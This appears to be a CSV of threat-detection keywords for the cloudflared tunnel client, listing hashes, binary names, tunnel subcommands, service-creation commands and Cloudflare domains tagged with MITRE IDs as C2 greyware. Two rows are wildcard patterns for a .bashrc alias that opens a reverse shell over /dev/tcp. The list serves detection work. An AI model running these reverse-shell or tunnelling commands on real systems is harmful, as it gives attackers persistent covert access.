"keyword","metadata_keyword_type","metadata_tool","metadata_description","metadata_tool_techniques","metadata_tool_tactics","metadata_malwares_name","metadata_groups_name","metadata_category","metadata_link","metadata_enable_endpoint_detection","metadata_enable_proxy_detection","metadata_comment","metadata_severity_score","metadata_popularity_score","metadata_github_stars","metadata_github_forks","metadata_github_updated_at","metadata_github_created_at"
"*\cloudflared-2024.*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*07b95428cfb9cb49c2447c2ff9fbc503225d5de7ff70c643f45399fc2f08c48c*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*0b917a040f43b5b120a3288f76e857203cc52f51c2f78c997d4d0c2da3d0c0c5*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*0ec73349570f7d8546b9ddfd6b0b409cd622abc133be641bb2a414a2d2b9a21e*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*17fa4fd9db3006f9aa649b0160770ebb9e9b8a599f6fb5afce83a16a7cb41bdd*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*1b3e09c31048ec7f2ef06166eb47dcdf0e563ca07b6dcc1318fa6f7db3feb458*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*2fb6c04c4f95fb8d158af94c137f90ac820716deaf88d8ebec956254e046cb29*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*33c9fa0bbaca1c4af7cf7c6016cda366612f497d08edd017bced7c617baa7fc2*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*33e6876bd55c2db13a931cf812feb9cb17c071ab45d3b50c588642b022693cdc*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*55c11ee0078d85ed35d7df237458e40b6ad687f46fc78b1886f30c197e1683c1*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*561304bd23f13aa9185257fb0f055e8790dc64e8cf95287e2bfc9fec160eecf8*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*569b8925a41bd1426fc9f88a4d00aa93da747ed4a5ec1c638678ac62ae1a7114*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*5868fed5581f3fb186c94b6be63f8b056c571159edb65cc5dafb84553e888d39*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*62700c23ce8560628d8eb07ab2adcf863ad901c9f631bb45ed4b4f801f35b2a5*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*6ee5eab9a9aa836ac397746a20afbb671971c6553bf8d6a844ba0a7a8de8447e*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*9a6f666b2d691d7c6aadd7b854b26cffd76735e9622f3613577b556fe29eb6a1*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*b3d21940a10fdef5e415ad70331ce257c24fe3bcf7722262302e0421791f87e8*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*b7e394578b41e9a71857e59d04b7bf582e3d0d15f314ab69f269be474a4b9e1a*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*ca6ac5c1c1f30675eecf91fe295d703007a754c1b320609ede7aa4783d899e9e*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*--chown=nonroot /go/src/github.com/cloudflare/cloudflared/cloudflared /usr/local/bin/*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel --config *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel create *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel info *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel list*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel login*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel route dns *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel route ip add *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel route ip show*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared tunnel run *","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared-amd64.pkg*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared-windows-386.exe*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared-windows-amd64.exe*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*cloudflared-windows-amd64.msi*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*d6c358a2b66fae4f2c9fa4ffa8cd37f6ab9b7d27c83414f70c1d6a210812f0fa*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*d79111ec8fa3659c887dd4e82f8ce6ff39391de6860ca0c2045469d6ab76a44f*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*dc76f7c6b506d3ec4a92d9a0cda9678c3cb58a9096587dde15897709c7b23a33*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*e8118e74c74a62a1d8dc291cb626f46d0056b1284726c2a5d671e20a5e92270c*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/*/* 0>&1'' >> */.bashrc* ","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/*/*>> ""$user/.bashrc""*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*ed4f5607dbc3fec5d43fbc22fb12a79d8bca07aa60c8733db7f495b7210d631f*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*fffec1382a3f65ecb8f1ebb2c74e3d7aa57485fb4cff4014aadc10b8e9f3abc8*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*protocol-v2.argotunnel.com*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*sc create Cloudflared binPath=\*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*sc.exe create Cloudflared binPath=\*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*sudo systemctl edit --full cloudflared.service*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","0","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*test-cloudflare-tunnel-cert-json.pem*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
"*update.argotunnel.com*","greyware_tool_keyword","cloudflared","cloudfared Contains the command-line client for Cloudflare Tunnel - a tunneling daemon that proxies traffic from the Cloudflare network to your origins","T1572 - T1090 - T1071","TA0001 - TA0011","N/A","N/A","C2","https://github.com/cloudflare/cloudflared","1","1","N/A","10","10","7112","699","2023-12-23T01:43:28Z","2017-10-13T19:54:47Z"
